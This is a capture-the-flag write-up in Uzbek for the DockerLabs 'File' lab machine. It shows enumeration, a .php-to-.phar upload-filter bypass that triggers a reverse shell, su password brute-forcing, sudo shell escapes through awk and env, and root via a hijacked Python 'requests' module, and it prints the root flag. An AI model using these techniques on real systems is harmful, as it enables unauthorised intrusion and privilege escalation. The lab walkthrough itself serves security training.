# File-dockerlabs

```
IP: 172.17.0.2
OS: Linux
Ports: 21 ftp, 80 http
Users: fernando, mario, julen, iker, root
Vulnerability: Arbitrary File Upload (.phar bypass), Sudo misconfiguration (lateral movement chain)
```

## root flag:
f0ea495293070da50a1c6e483a0525e7

---

# 1. Enumeration

Mashina nomi `File`. IP adressdan foydalanib ochiq portlarni aniqlab oldim:

```bash
nmap -sV -sC -A -p- --min-rate 1000 172.17.0.2
```

Natijada 2 ta ochiq port:
- 21 FTP — anonymous kirish imkoni bor
- 80 HTTP — Apache2 default sahifasi

Web sahifaning qo'shimcha kataloglarini qidirdim:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,env -b 401,403,404
```

`/uploads` va `/file_upload.php` pathlari topildi.

---

# 2. Exploitation

`/file_upload.php` sahifasida fayl yuklash imkoni bor ekan. Kali'dan `shell.php` reverse shell faylini tayyorlab, IP va PORT o'zgartirdim.

`.php` kengaytmali fayl yuklash bloklanган. Kengaytmani `.phar` ga o'zgartirib yuklab ko'rdim — muvofaqiyatli bo'ldi.

```bash
curl http://172.17.0.2/uploads/shell.phar
```

`www-data` sheli keldi.

---

# 3. Initial Access

`www-data` dan userlarga o'tish uchun GitHubdan `su-bruteforce` skriptini oldim. Python HTTP server orqali targetga ko'chirdim.

```bash
chmod +x suBF.sh
./suBF.sh -u fernando -w top12000.txt
```

`fernando` paroli: **chocolate**

```bash
./suBF.sh -u mario -w top12000.txt
```

`mario` paroli: **password123**

---

# 4. Privilege Escalation

`mario` useri `julen` nomidan `/usr/bin/awk` ishga tushira oladi:

```bash
sudo -u julen /usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

`julen` useri `iker` nomidan `/usr/bin/env` ishga tushira oladi:

```bash
sudo -u iker /usr/bin/env /bin/bash -p
```

`iker` home'da `geo_ip.py` fayli bor, ichida `import requests` bor. Python local pathdan import qidiradi — shu pathga zararli `requests.py` yaratdim:

```bash
echo 'import os; os.system("/bin/bash")' > /home/iker/requests.py
sudo /usr/bin/python3 /home/iker/geo_ip.py
```

Root huquqi olindi!

---

**Mashina muvofaqiyatli yechildi!**
